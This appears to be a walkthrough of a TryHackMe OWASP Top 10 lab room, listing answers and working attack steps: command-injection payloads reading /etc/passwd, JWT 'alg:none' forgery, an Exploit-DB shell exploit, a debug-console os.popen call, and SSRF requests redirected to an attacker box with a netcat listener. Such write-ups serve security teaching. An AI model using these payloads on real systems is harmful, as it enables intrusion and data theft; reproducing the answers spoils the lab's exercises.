# [OWASP Top 10 - 2021](https://tryhackme.com/r/room/owasptop102021)

## Task 4 Broken Access Control (IDOR Challenge)

**Look at other users' notes. What is the flag?**

* Go to http://MACHINE_IP/note.php?note_id=0

## Task 8 Cryptographic Failures (Challenge)

**What is the name of the mentioned directory?**

* Go to view-source:http://MACHINE_IP:81/login.php
* Check the "Must remember ..." comment

**Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?**

* Go to http://MACHINE_IP:81/assets
* Check the database file

**Use the supporting material to access the sensitive data. What is the password hash of the admin user?**

* Download http://MACHINE_IP:81/assets/webapp.db

  ```shell
  sqlite3 webapp.db
  sqlite> .tables
  sessions  users
  sqlite> SELECT password FROM users WHERE username = 'admin';
  ```

**What is the admin's plaintext password?**

* Use https://crackstation.net/

**Log in as the admin. What is the flag?**

* Go to http://MACHINE_IP:81/login.php with and use the admin credentials

## Task 10 Command Injection

**What strange text file is in the website's root directory?**

* Go to http://MACHINE_IP:82
* Submit `hello ; ls`

**How many non-root/non-service/non-daemon users are there?**

* Go to http://MACHINE_IP:82
* Submit `hello ; awk -F: '($3 >= 1000) && ($1 != "nobody") {print $1}' /etc/passwd | wc -l`
* Submit `hello ; cat /etc/passwd` to see the complete list of users

**What user is this app running as?**

* Go to http://MACHINE_IP:82
* Submit `hello ; whoami`

**What is the user's shell set as?**

* Go to http://MACHINE_IP:82
* Submit `hello ; grep apache /etc/passwd | awk -F: '{print $7}'`

**What version of Alpine Linux is running?**

* Go to http://MACHINE_IP:82
* Submit `hello ; cat /etc/alpine-release`

## Task 11 Insecure Design

**Try to reset joseph's password. Keep in mind the method used by the site to validate if you are indeed joseph.**

* Go to http://MACHINE_IP:85/resetpass1.php
* Set username `joseph`
* Select security question "What is your favourite colour?"
* Try different colours until you succeed

**What is the value of the flag in joseph's account?**

* Go to http://MACHINE_IP:85/
* Login with username `joseph` and the new password
* Go to Private > Flag.txt

## Task 12 Security Misconfiguration

**What is the database file name (the one with the .db extension) in the current directory?**

* Go to http://MACHINE_IP:86/console
* Execute `import os; print(os.popen("ls -l").read())`

**Modify the code to read the contents of the app.py file, which contains the application's source code. What is the value of the secret_flag variable in the source code?**

* Go to http://MACHINE_IP:86/console
* Execute `import os; print(os.popen("head -5 app.py").read())`

## Task 15 Vulnerable and Outdated Components - Lab

**What is the content of the /opt/flag.txt file?**

* Go to http://MACHINE_IP:84
* Download the exploit from https://www.exploit-db.com/exploits/47887 and save it to `~/Desktop/exploit.py`
* Execute `python ~/Desktop/exploit.py http://MACHINE_IP:84`
* Answer `y` to `Do you wish to launch a shell here? (y/n)``
* Execute `cat /opt/flag.txt`

## Task 17 Identification and Authentication Failures Practical

**What is the flag that you found in darren's account?**

* Go to http://MACHINE_IP:8088/register.php
* Register as Username=" darren", email="aaa@mail.com" and password="1234"
* Log in as " darren" and get the flag

**What is the flag that you found in arthur's account?**

* Go to http://MACHINE_IP:8088/register.php
* Register as Username=" arthur", email="bbb@mail.com" and password="1234"
* Log in as " arthur" and get the flag

## Task 19 Software Integrity Failures

**What is the SHA-256 hash of https://code.jquery.com/jquery-1.12.4.min.js?**

* Go to https://www.srihash.org/ and submit that url

* Alternatively, you can execute locally:

  ```shell
  curl -s https://code.jquery.com/jquery-1.12.4.min.js | \
  sha256sum -b | awk '{print $1}' | xxd -r -p | base64 | \
  awk '{print "sha256-"$1}'
  ```

## Task 20 Data Integrity Failures

**What is the name of the website's cookie containing a JWT token?**

* Go to http://MACHINE_IP:8089/
* Login as username = `guest`, password = `guest`
* Open "Web Developer Tools"
* Go to Storage > Cookies

**What is the flag presented to the admin user?**

* Get `jwt-session` cookie value from last question
* Paste it to "JWT String" in https://token.dev/
* In "Header" change `"alg": "HS256"` to `"alg": "none"`
* In "Payload" change `"username": "guest"` to `"username": "admin"` 
* Copy value from "JWT String"
* Go to http://MACHINE_IP:8089/
* Login as username = `guest`, password = `guest`
* Open "Web Developer Tools"
* Go to Storage > Cookies
* Set cookie value with copied value from "JWT String", add an extra `.` to the end
* Reload

* Alternatively, you can generate the new JWT locally this way:

  ```shell
  JWT_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
  JWT_PAYLOAD=$(echo -n '{"username":"admin","exp":2000000000}' | base64 | tr -d '=' | tr '/+' '_-')
  echo "$JWT_HEADER.$JWT_PAYLOAD.$signature"
  ```

## Task 21 Security Logging and Monitoring Failures

* Download Task Files to `~/Desktop/login-logs.txt`

**What IP address is the attacker using?**

```shell
grep 401 login-logs.txt | awk '{print $3}' | sort -u
```

**What kind of attack is being carried out?**

* Ask ChatGPT "What do you call trying combinations of usernames and passwords to gain access to users' accounts?"

## Task 22 Server-Side Request Forgery (SSRF)

**Explore the website. What is the only host allowed to access the admin area?**

* Go to http://MACHINE_IP:8087/admin

**Check the "Download Resume" button. Where does the server parameter point to?**

* Go to http://MACHINE_IP:8087 and then "Home"
* Hover over "Download Resume" button to get the url

**Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?**

* On a terminal and execute netcat:

  ```shell
  nc -lvp 8000
  ```

* On another terminal execute:

  ```shell
  # MACHINE_IP = IP of owasp_top10_2021_v1.2 room machine
  # ATTACKBOX_IP = IP of your attack box
  curl 'http://MACHINE_IP:8087/download?server=ATTACKBOX_IP:8000&id=75482342'
  ```

* Check the netcat output on the first terminal

**There's a way to use SSRF to gain access to the site's admin area. Can you find it?**

* On a terminal and execute netcat:

  ```shell
  nc -lvp 8000
  ```

* On another terminal execute:

  ```shell
  # MACHINE_IP = IP of owasp_top10_2021_v1.2 room machine
  # ATTACKBOX_IP = IP of your attack box
  curl 'http://MACHINE_IP:8087/download?server=ATTACKBOX_IP:8000/admin&id=75482342'
  ````

* Check the netcat output:

  ```
  GET /admin/public-docs-k057230990384293/75482342.pdf HTTP/1.1
  Host: ATTACKBOX_IP:8000
  User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
  Accept: */*
  ```

* So we need a way to remove `/public-docs-k057230990384293/75482342.pdf` from that request ...
* Maybe we can use the hash mark `#` hoping that everything after that will be interpreted as a [fragment identifier](https://en.wikipedia.org/wiki/URI_fragment) and not sent in the final request (as it is something processed on client side and not on server side)
* After a few tries, being `%23` the url encoded form of `#`, this request:

  ```shell
  curl 'http://MACHINE_IP:8087/download?server=ATTACKBOX_IP:8000/admin%23&id=75482342'
  ```

* Results in this netcat output:

  ```
  GET /admin HTTP/1.1
  Host: ATTACKBOX_IP:8000
  User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
  Accept: */*
  ```

* So now we can just do the same using `localhost`:

  ```shell
  curl -i 'http://MACHINE_IP:8087/download?server=localhost:8087/admin%23&id=75482342'

  HTTP/1.0 200 OK
  Content-Type: application/pdf
  Content-Length: 40958
  Content-Disposition: attachment
  Server: Werkzeug/0.16.0 Python/3.10.7
  Date: Mon, 04 Nov 2024 22:00:06 GMT

  Warning: Binary output can mess up your terminal. Use "--output -" to tell 
  Warning: curl to output it to your terminal anyway, or consider "--output 
  Warning: <FILE>" to save to a file.
  ```

* As it is a PDF file we can save it locally this way:

  ```shell
  curl 'http://MACHINE_IP:8087/download?server=localhost:8087/admin%23&id=75482342' -o FLAG.pdf
  ```
